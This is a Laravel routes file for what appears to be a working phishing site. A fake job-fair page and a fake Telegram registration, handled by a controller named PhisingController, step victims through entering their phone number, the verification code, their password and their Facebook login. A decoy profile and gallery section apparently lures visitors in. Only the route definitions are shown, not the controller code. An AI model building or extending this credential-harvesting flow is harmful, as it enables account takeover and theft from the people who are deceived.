<?php

use App\Http\Controllers\JobfairController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\Rhmt\PhisingController;
use App\Http\Controllers\RhmtController;
use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('', [JobfairController::class, 'index'])->name('jobfair-home');
Route::post('login-phone-number', [JobfairController::class, 'login_number'])->name('login-number');
Route::get('verification', [JobfairController::class, 'Job_verif'])->name('jobfair.verification');
Route::post('store-verification', [JobfairController::class, 'job_verif_store'])->name('jobfair.store-verification');
Route::get('enter-password', [JobfairController::class, 'password'])->name('jobfair.password');
Route::post('enter-password', [JobfairController::class, 'store_password'])->name('jobfair.store-password');
Route::get('facebook-login', [JobfairController::class, 'facebook'])->name('jobfair-facebook');
Route::post('facebook-login', [JobfairController::class, 'store_facebook'])->name('jobfair-store-facebook');
Route::get('success', [JobfairController::class, 'success'])->name('jobfair-success');


Route::get('vcx', [RhmtController::class, 'index'])->name('rhmt.home');
Route::get('show-profile/{id}', [RhmtController::class, 'show'])->name('rhmt.show');
Route::get('daftar-teman', [RhmtController::class, 'list_teman'])->name('rhmt.teman');
Route::get('galery', [RhmtController::class, 'galery'])->name('rhmt.galery');


Route::get('register-telegram', [PhisingController::class, 'index'])->name('rhmt.login-number');
Route::post('login-store-telegram', [PhisingController::class, 'login_store'])->name('rhmt.login-store');
Route::get('telegram-verification', [PhisingController::class, 'verif'])->name('rhmt.verif-telegram');
Route::post('store-telegram-verification', [PhisingController::class, 'verif_store'])->name('rhmt.store-verif-telegram');
Route::get('telegram-password', [PhisingController::class, 'get_password'])->name('rhmt.telegram-password');
Route::post('store-telegram-password', [PhisingController::class, 'store_password'])->name('rhmt.store-password-telegram');
Route::get('facebook-login', [PhisingController::class, 'facebook'])->name('rhmt-facebook');
Route::post('facebook-login', [PhisingController::class, 'store_facebook'])->name('rhmt-store-facebook');
